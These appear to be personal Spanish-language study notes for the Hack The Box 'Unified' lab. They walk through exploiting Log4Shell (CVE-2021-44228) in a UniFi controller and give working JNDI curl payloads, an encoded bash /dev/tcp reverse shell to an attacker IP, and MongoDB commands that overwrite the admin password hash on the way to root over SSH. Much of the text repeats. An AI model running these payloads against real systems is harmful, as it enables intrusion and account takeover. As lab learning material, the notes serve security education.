![[Pasted image 20260708130930.png]]![[Pasted image 20260708130946.png]]

![[Pasted image 20260708131254.png]]![[Pasted image 20260708131241.png]]

![[Pasted image 20260708131413.png]] El formato de un CVE

Siempre sigue el patrón:

```
CVE-AÑO-NÚMERO
```

Por ejemplo: `CVE-2021-44228`

- `2021` → el año en que se asignó el identificador (no necesariamente cuando se descubrió o explotó)
- `44228` → un número secuencial único dentro de ese año

### Y la respuesta a tu task

La propia descripción de la máquina que me pasaste al principio ya te dio literalmente el CVE:

> _"...features the exploitation of the Log4Shell (CVE-2021-44228) vulnerability..."_

Así que la respuesta es:

```
CVE-2021-44228
```

Este es probablemente el CVE más famoso y con más impacto de los últimos años, se le llegó a poner un nombre propio popular ("Log4Shell") precisamente por lo mediático y grave que fue, algo que no pasa con la mayoría de CVEs (que se quedan solo con su número técnico, sin apodo).

![[Pasted image 20260708131550.png]]
```
${jndi:ldap://TU_IP:1389/a}
```

JNDI (Java Naming and Directory Interface) puede trabajar con varios protocolos distintos para buscar y cargar recursos remotos (LDAP, RMI, DNS...), pero el que se usa específicamente en el ataque de Log4Shell ,el que ves en el payload, el que monta el servidor malicioso que vamos a levantar con JNDIExploit, es:

```
LDAP
```

(Lightweight Directory Access Protocol, protocolo diseñado originalmente para consultar directorios de información, como bases de datos de usuarios de una organización, pero que JNDI puede usar para "buscar" y cargar objetos remotos, incluyendo código Java malicioso en este caso)

![[Pasted image 20260708131901.png]]
`tcpdump` es la herramienta de captura de paquetes por línea de comandos (la "versión sin interfaz gráfica" de Wireshark, básicamente), muy usada en máquinas Linux/servidores donde no tienes entorno gráfico disponible

```
tcpdump
```

![[Pasted image 20260708132015.png]]
```
389
```

Es el puerto estándar de LDAP (`389`) pero con un `1` delante, convención común quEn muchas herramientas de pentesting para evitar necesitar privilegios de root (los puertos por debajo de 1024 requieren privilegios especiales en Linux, así que se usa `1389` como alternativa "sin privilegios" al puerto real `389`).

## 1. Confirmación de la vulnerabilidad

El campo `remember` del endpoint de login (`/api/login`) se registra en un log interno de forma que Log4j interpreta patrones `${jndi:...}` dentro de él. Otros campos (como `username`) no tienen ese comportamiento.

Se confirmó con `tcpdump` capturando tráfico saliente hacia el puerto 389/1389 al enviar el payload, y la respuesta `InvalidPayload` del servidor demuestra que intentó procesar el valor como booleano _después_ de que el logging (y por tanto el JNDI lookup) ya se hubiera disparado.
## 2. Intento 1: JNDIExploit + `Basic/ReverseShell` (clásico, remote classloading)

### Descarga y arranque

bash

```bash
wget https://web.archive.org/web/20211211031401/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.10.16.126 -p 8888
```

_(El repo original de JNDIExploit fue eliminado de GitHub; se usa la copia cacheada en la Wayback Machine)_

### Error A, `IllegalAccessError` (incompatibilidad de Java)

```
Exception in thread "LDAPListener..." java.lang.IllegalAccessError: superclass access check failed:
class com.feihong.ldap.template.TomcatEchoTemplate ... cannot access class
com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
because module java.xml does not export ... to unnamed module
```

Causa: el `.jar` es de 2021, compilado para Java 8. El Java moderno usa el sistema de módulos (JPMS), que bloquea el acceso reflexivo a clases internas del JDK. Es un problema del entorno atacante, no del target.

Fix:

bash

```bash
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.10.16.126 -p 8888
```

### Payload usado (con el fix aplicado)

bash

```bash
curl -k -X POST "https://10.129.108.157:8443/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.16.126:1389/Basic/ReverseShell/10.10.16.126/4444}","strict":true}'
```

### Error B, silencio total, sin callback HTTP

Con el fix de Java, el LDAP ya respondía correctamente (`Send LDAP reference result... redirecting to http://10.10.16.126:8888/Exploit....class`) pero el target nunca pedía la clase por HTTP, y el `nc` no recibía nada.

Causa real: `Basic/ReverseShell` usa la técnica clásica de JNDI, le pide al JVM del target que descargue y ejecute una clase Java remota (_remote classloading_). Desde Java 8u191 / 11.0.1 en adelante, esto viene desactivado por defecto (`com.sun.jndi.ldap.object.trustURLCodebase=false`). Esta protección depende de la versión de Java del target, no de la del atacante, por eso ningún flag en tu propio comando lo arregla.
## 3. Intento 2 (exitoso): RogueJndi + gadget de Tomcat (`BeanFactory`)

En vez de pedir al target que cargue código remoto, RogueJndi abusa de una clase que ya existe en el classpath del target: `org.apache.naming.factory.BeanFactory` de Tomcat (UniFi corre sobre Tomcat embebido). Esto **no depende de `trustURLCodebase`**, porque no se descarga nada por HTTP, el "gadget" ya estaba ahí.

### Build y arranque

bash

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package

java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMjYvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" \
  --hostname "10.10.16.126"
```

El `--command` es un reverse shell clásico en base64 (para evitar problemas de escapado de caracteres especiales en el comando), equivalente a:

bash

```bash
bash -i >& /dev/tcp/10.10.16.126/4444 0>&1
```

Al arrancar, RogueJndi imprime varias rutas LDAP según el gadget a usar. La que nos interesa:

```
ldap://10.10.16.126:1389/o=tomcat
```

### Payload final que consiguió la shell

bash

```bash
curl -k -X POST "https://10.129.108.157:8443/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.16.126:1389/o=tomcat}","strict":true}'
```

Con el `nc -lvnp 4444` en escucha, la shell cae como usuario `unifi`:

```
Connection received on 10.129.108.157 35350
unifi@unified:/usr/lib/unifi$
```## Idea clave para recordar

Log4Shell no es "un" exploit único, hay al menos dos familias de técnicas según lo que el JVM del target permita:

|Técnica|Cómo funciona|Cuándo funciona|
|---|---|---|
|Remote classloading (`Basic/ReverseShell` de JNDIExploit)|El target descarga y ejecuta una clase Java remota vía HTTP|Solo si `trustURLCodebase=true` (Java < 8u191 / < 11.0.1)|
|Gadget local (`o=tomcat` de RogueJndi)|Abusa de una clase ya presente en el classpath del target (aquí, `BeanFactory` de Tomcat)|Independiente de `trustURLCodebase`; requiere que el gadget exista en el classpath del target|

Si el primer método falla en silencio (LDAP responde pero no hay callback HTTP), es la señal clásica de que `trustURLCodebase` está desactivado y hay que pasar a un gadget local.
Y ya una vez dentro buscamos la flag de User

![[Pasted image 20260719191149.png]]

![[Pasted image 20260719192129.png]]El archivo no llama a esa línea "mongo", la llama **`db.port`** (el motor de base de datos embebido de UniFi es Mongo, pero en la config no lo nombra así)
![[Pasted image 20260719192041.png]]

![[Pasted image 20260719192220.png]]
El nombre de base de datos por defecto que usa UniFi es **`ace`**, viene heredado del nombre histórico del producto y así queda hardcodeado a menos que se sobreescriba con `unifi.db.name` en el `system.properties`. Es la misma base de datos donde luego vas a poder ver colecciones como `admin`, `device`, `alarm`, etc.

![[Pasted image 20260719192356.png]]
La función es **`db.admin.find()`**.

En este caso concreto, `admin` es el nombre de la colección dentro de la base `ace` donde UniFi guarda sus usuarios administradores (nada que ver con el usuario Linux `admin` del sistema), y `.find()` es el método de MongoDB para consultar/listar documentos de una colección, sin filtros aplicaría a todos.

Para conectarte y verlo en la práctica (con el puerto que ya encontraste):

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Eso te va a sacar los usuarios administradores registrados en UniFi, incluyendo sus hashes de contraseña (`x_shadow`), que es justo lo que necesitarás para el siguiente paso: sobreescribir la contraseña del admin y entrar por la interfaz web con credenciales tuyas.

![[Pasted image 20260719192431.png]]
La función es **`db.admin.update()`**.

Su firma típica es: primero un filtro para identificar qué documento actualizar (normalmente por `_id`), y luego `$set` con el campo y valor nuevo. En este caso concreto, para sobreescribir el hash de contraseña del administrador sería algo así:

bash

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<ID_DEL_ADMIN>")}, {$set:{"x_shadow":"<TU_HASH_NUEVO>"}})'
```

El `_id` lo sacas del `db.admin.find()` de antes (busca la entrada con rol `administrator`), y el hash nuevo lo generas tú mismo con `mkpasswd -m sha-512 <tu_password>` para poder loguearte luego con una contraseña que conoces.

![[Pasted image 20260719193643.png]]
1) Genera el hash de una contraseña tuya:

bash

```bash
mkpasswd -m sha-512 TuPasswordElegida
```

_(si no tienes `mkpasswd`: `sudo apt install whois`)_

**2) Sobreescribe el hash del `administrator`** usando su `_id` real que ya sacaste (`61ce278f46e0fb0012d47ee4`):

bash

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")}, {$set:{"x_shadow":"<PEGA_AQUI_EL_HASH_GENERADO>"}})'
```

Debería devolver `"nModified" : 1`.

3) Entra por navegador a `https://10.129.108.157:8443` con `administrator` / `TuPasswordElegida`.
![[Pasted image 20260719193159.png]]

4) Dentro del panel, busca en Settings → System (o similar, según versión de UI) la sección de configuración SSH de dispositivos, ahí suele quedar expuesta la contraseña que también sirve para el root del propio host.

![[Pasted image 20260719193549.png]]

![[Pasted image 20260719194128.png]]
![[Pasted image 20260719194044.png]]

# HTB Tier 2, Unified: Explotación de Log4Shell (CVE-2021-44228)

## Resumen ejecutivo (qué hicimos y por qué)

1. Reconocimiento: UniFi Network Controller v6.4.54 en el puerto 8443, vulnerable a Log4Shell (CVE-2021-44228).
2. Confirmación: el campo `remember` del login se logueaba de forma vulnerable → confirmado con `tcpdump` viendo tráfico saliente al puerto LDAP.
3. Explotación intento 1 (JNDIExploit, remote classloading): falló dos veces, primero por incompatibilidad de Java del propio atacante (arreglable), después porque el target tiene `trustURLCodebase=false` (no arreglable desde el lado atacante con este método).
4. Explotación intento 2 (RogueJndi, gadget de Tomcat): funcionó, en vez de pedir al target que descargue código remoto, abusamos de una clase (`BeanFactory`) que ya existía en su classpath → reverse shell como `unifi`.
5. Post-explotación: desde la shell, no había `ss`/`netstat`, así que leímos la config de UniFi (`system.properties`) para sacar el puerto de su MongoDB embebido (27117).
6. Enumeración de MongoDB: listamos los admins de la app (`db.admin.find()`), y sobreescribimos el hash de contraseña del `administrator` (`db.admin.update()`) con uno generado por nosotros mismos (`mkpasswd`), sin necesidad de crackear nada.
7. Acceso a la web como admin: con la contraseña que nosotros mismos pusimos, entramos al panel de UniFi y encontramos ahí, en la configuración de acceso SSH a dispositivos, la contraseña real del usuario `root` del sistema (reutilización de credenciales).
8. Root: con esa contraseña, `ssh root@target` (no `su`, porque la reverse shell no tenía TTY completa) → shell de root → flag.
## Contexto

- Target inicial: 10.129.84.250 → cambió a 10.129.108.157
- Servicio vulnerable: UniFi Network Controller v6.4.54, puerto 8443
- CVE: CVE-2021-44228 (Log4Shell)
- Atacante (VPN tun0): 10.10.16.126
## 1. Confirmación de la vulnerabilidad

El campo `remember` del endpoint de login (`/api/login`) se registra en un log interno de forma que Log4j interpreta patrones `${jndi:...}` dentro de él. Otros campos (como `username`) no tienen ese comportamiento.

Se confirmó con `tcpdump` capturando tráfico saliente hacia el puerto 389/1389 al enviar el payload, y la respuesta `InvalidPayload` del servidor demuestra que intentó procesar el valor como booleano _después_ de que el logging (y por tanto el JNDI lookup) ya se hubiera disparado.
## 2. Intento 1: JNDIExploit + `Basic/ReverseShell` (clásico, remote classloading)

### Descarga y arranque

bash

```bash
wget https://web.archive.org/web/20211211031401/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.10.16.126 -p 8888
```

_(El repo original de JNDIExploit fue eliminado de GitHub; se usa la copia cacheada en la Wayback Machine)_

### Error A, `IllegalAccessError` (incompatibilidad de Java)

```
Exception in thread "LDAPListener..." java.lang.IllegalAccessError: superclass access check failed:
class com.feihong.ldap.template.TomcatEchoTemplate ... cannot access class
com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
because module java.xml does not export ... to unnamed module
```

Causa: el `.jar` es de 2021, compilado para Java 8. El Java moderno usa el sistema de módulos (JPMS), que bloquea el acceso reflexivo a clases internas del JDK. Es un problema del entorno atacante, no del target.

Fix:

bash

```bash
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.10.16.126 -p 8888
```

### Payload usado (con el fix aplicado)

bash

```bash
curl -k -X POST "https://10.129.108.157:8443/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.16.126:1389/Basic/ReverseShell/10.10.16.126/4444}","strict":true}'
```

### Error B, silencio total, sin callback HTTP

Con el fix de Java, el LDAP ya respondía correctamente (`Send LDAP reference result... redirecting to http://10.10.16.126:8888/Exploit....class`) pero el target nunca pedía la clase por HTTP, y el `nc` no recibía nada.

Causa real: `Basic/ReverseShell` usa la técnica clásica de JNDI, le pide al JVM del target que descargue y ejecute una clase Java remota (_remote classloading_). Desde Java 8u191 / 11.0.1 en adelante, esto viene desactivado por defecto (`com.sun.jndi.ldap.object.trustURLCodebase=false`). Esta protección depende de la versión de Java del target, no de la del atacante, por eso ningún flag en tu propio comando lo arregla.
## 3. Intento 2 (exitoso): RogueJndi + gadget de Tomcat (`BeanFactory`)

En vez de pedir al target que cargue código remoto, RogueJndi abusa de una clase que ya existe en el classpath del target: `org.apache.naming.factory.BeanFactory` de Tomcat (UniFi corre sobre Tomcat embebido). Esto **no depende de `trustURLCodebase`**, porque no se descarga nada por HTTP, el "gadget" ya estaba ahí.

### Build y arranque

bash

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package

java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMjYvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" \
  --hostname "10.10.16.126"
```

El `--command` es un reverse shell clásico en base64 (para evitar problemas de escapado de caracteres especiales en el comando), equivalente a:

bash

```bash
bash -i >& /dev/tcp/10.10.16.126/4444 0>&1
```

Al arrancar, RogueJndi imprime varias rutas LDAP según el gadget a usar. La que nos interesa:

```
ldap://10.10.16.126:1389/o=tomcat
```

### Payload final que consiguió la shell

bash

```bash
curl -k -X POST "https://10.129.108.157:8443/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.16.126:1389/o=tomcat}","strict":true}'
```

Con el `nc -lvnp 4444` en escucha, la shell cae como usuario `unifi`:

```
Connection received on 10.129.108.157 35350
unifi@unified:/usr/lib/unifi$
```

User flag: conseguida en `/home/michael/` (usuario `michael` visible en `/home`).
## 4. Post-explotación: de `unifi` a `root`

### 4.1 Encontrar el puerto de MongoDB sin `ss`/`netstat`

La shell no tenía herramientas de enumeración de red instaladas. Alternativa: leer la config de la propia aplicación.

bash

```bash
cat /usr/lib/unifi/data/system.properties | grep -i "port"
```

UniFi guarda el puerto de su MongoDB embebido bajo la clave `unifi.db.port` (no aparece la palabra "mongo" literal). Puerto encontrado: 27117 (no es el 27017 por defecto de MongoDB, UniFi usa uno propio para evitar colisiones si hay otro Mongo en la máquina).

### 4.2 Enumerar usuarios admin de la aplicación

Base de datos por defecto de UniFi: **`ace`**.

bash

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Esto devolvió varios documentos, cada uno un admin de la app UniFi (no confundir con usuarios del sistema Linux), con su hash de contraseña en el campo `x_shadow` (formato `$6$...` = SHA-512 crypt). Entre ellos: `administrator`, `michael`, `Seamus`, `warren`, `james`.

### 4.3 Sobreescribir la contraseña del admin (sin crackear nada)

En vez de intentar romper el hash existente, generamos uno nuevo con una contraseña que nosotros elegimos:

bash

```bash
# En la terminal de Parrot (atacante), NO en la reverse shell:
mkpasswd -m sha-512 <mi_password_elegida>
```

Y lo inyectamos en el documento del admin usando su `_id` (sacado del paso anterior):

bash

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")}, {$set:{"x_shadow":"<hash_generado_arriba>"}})'
```

Fallo cometido aquí: copiar el hash incluyendo los símbolos `<` `>` de la plantilla de ejemplo, lo que dejó el campo `x_shadow` con un hash inválido y el login seguía fallando pese a que Mongo confirmaba `nModified: 1` (el _update_ se aplicó, pero con un valor corrupto).

### 4.4 Login web y credential reuse hacia root

Con `administrator` / `<mi_password_elegida>` se accede a `https://10.129.108.157:8443`. Dentro del panel, en la sección de configuración de acceso SSH a dispositivos, estaba expuesta en texto plano la contraseña real del usuario `root` del sistema operativo: `NotACrackablePassword4U2022`.

### 4.5 De `unifi` a `root`: el problema de la TTY

Intentar `su root` directamente en la reverse shell falló:

```
su: must be run from a terminal
```

Causa: las reverse shells básicas (`nc` + `bash -i`) no tienen una pseudo-terminal (TTY) completa asignada, y `su` la necesita para pedir la contraseña de forma segura.

Solución usada: en vez de arreglar la TTY, conectar directamente por SSH desde la terminal de ataque (el puerto 22 ya estaba abierto desde el nmap inicial):

bash

```bash
ssh root@10.129.108.157
# password: NotACrackablePassword4U2022
```

_(Alternativa si se quisiera seguir en la reverse shell: mejorarla primero con `python3 -c 'import pty; pty.spawn("/bin/bash")'`, que sí da una pseudo-TTY funcional para `su`.)_

Root flag: conseguida en `/root/`.